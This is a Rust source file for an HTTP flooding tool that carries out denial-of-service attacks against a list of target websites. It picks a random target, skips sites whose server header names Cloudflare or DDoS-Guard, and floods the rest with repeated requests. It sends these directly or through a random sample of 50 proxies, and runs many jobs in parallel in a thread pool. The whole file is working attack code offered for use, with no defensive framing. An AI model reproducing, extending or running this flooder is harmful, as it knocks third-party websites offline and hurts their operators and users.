mod client;
mod provider;
mod settings;

use rand::seq::IteratorRandom;
use rand::seq::SliceRandom;
use threadpool::ThreadPool;

fn flood_action() {
    let sites = provider::get_target_sites();
    let site = sites.choose(&mut rand::thread_rng()).unwrap().clone();

    let mut count_attacks_for_current_site = 0;
    match client::fetch(&site, None) {
        Ok(probe) => {
            if detect_ddos_protection(&probe) {
                println!("Site has ddos protection");
                return;
            }
            if probe.status().as_u16() >= 302 {
                let proxies = provider::load_proxies();
                let sampled_proxies = proxies.iter().choose_multiple(&mut rand::thread_rng(), 50);

                for proxy in sampled_proxies {
                    if count_attacks_for_current_site >= settings::MAX_REQUESTS_TO_SITE {
                        return;
                    }

                    match client::fetch(&site, Some(proxy.clone())) {
                        Ok(proxy_response) => {
                            let response_status = proxy_response.status().as_u16();

                            if response_status >= 200 && response_status <= 302 {
                                while count_attacks_for_current_site
                                    < settings::MAX_REQUESTS_TO_SITE
                                {
                                    let response_status =
                                        match client::fetch(&site, Some(proxy.clone())) {
                                            Ok(response) => response.status().as_u16(),
                                            Err(_) => 503, // if connection error service unavailable and response is 503
                                        };
                                    if response_status >= 403 {
                                        return;
                                    }
                                    count_attacks_for_current_site += 1;
                                }
                            }
                        }
                        Err(_) => {}
                    }
                }
            } else {
                while count_attacks_for_current_site < settings::MAX_REQUESTS_TO_SITE {
                    let response_status = match client::fetch(&site, None) {
                        Ok(response) => response.status().as_u16(),
                        Err(_) => 503, // if connection error service unavailable and response is 503
                    };
                    if response_status >= 403 {
                        return;
                    }
                    count_attacks_for_current_site += 1;
                }
            }
        }
        Err(_) => {}
    }
    println!(
        "TOTAL ATTACKS TO SITE {:?} is {:?}",
        site, count_attacks_for_current_site
    );
}

fn detect_ddos_protection(probe: &isahc::Response<isahc::Body>) -> bool {
    match probe.headers().get("server") {
        Some(value) => {
            if value.eq("cloudflare") {
                return true;
            }
            if value.eq("ddos-guard") {
                return true;
            }
        }
        None => {}
    }
    return false;
}
fn main() {

    let pool = ThreadPool::new(settings::MAX_WORKERS);
    for _ in 1..settings::MAX_JOBS {
        pool.execute(|| {
            flood_action();
        })
    }
    pool.join();
    // loop {
    //     flood_action();
    // }
}
